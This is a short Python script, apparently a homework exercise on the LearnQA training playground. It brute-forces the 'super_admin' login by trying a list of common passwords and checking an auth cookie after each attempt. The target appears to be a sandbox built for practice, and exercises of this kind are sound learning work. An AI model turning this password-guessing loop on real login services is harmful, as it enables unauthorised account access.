import requests

url_get_cookie = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

login = "super_admin"

passwords = [
    "password",
    "123456",
    "12345678",
    "qwerty",
    "abc123",
    "monkey",
    "1234567",
    "letmein",
    "trustno1",
    "dragon",
    "baseball",
    "111111",
    "iloveyou",
    "master",
    "sunshine",
    "ashley",
    "bailey",
    "passw0rd",
    "shadow",
    "123123",
    "654321",
    "superman",
    "qazwsx",
    "michael",
    "Football",
    "password1",
    "000000",
    "123456789",
    "adobe123",
    "admin",
    "1234567890",
    "photoshop",
    "1234",
    "12345",
    "princess",
    "welcome",
    "login",
    "solo",
    "1qaz2wsx",
    "mustang",
    "access",
    "696969",
    "batman",
    "starwars",
    "121212",
    "flower",
    "hottie",
    "loveme",
    "zaq1zaq1",
    "football",
    "666666",
    "qwertyuiop",
    "555555",
    "lovely",
    "7777777",
    "888888",
    "aa123456",
    "!@#$%^&*",
    "charlie",
    "donald",
    "freedom",
    "whatever",
    "qwerty123",
    "123qwe",
    "hello",
    "jesus",
    "ninja",
    "azerty"
]

for password in passwords:
    # отправляем логин и пароль в первый метод
    print("Проверяю пароль:", password)
    response = requests.post(
        url_get_cookie,
        data={"login": login, "password": password}
    )

    # получаем auth_cookie
    auth_cookie = response.cookies.get("auth_cookie")

    # передаем cookie во второй метод
    response = requests.get(
        url_check_cookie,
        cookies={"auth_cookie": auth_cookie}
    )

    # если пароль неправильный - пробуем следующий
    if response.text == "You are NOT authorized":
        continue

    # если пароль правильный - выводим его и ответ
    if response.text == "You are authorized":
        print("Пароль:", password)
        print(response.text)
        break
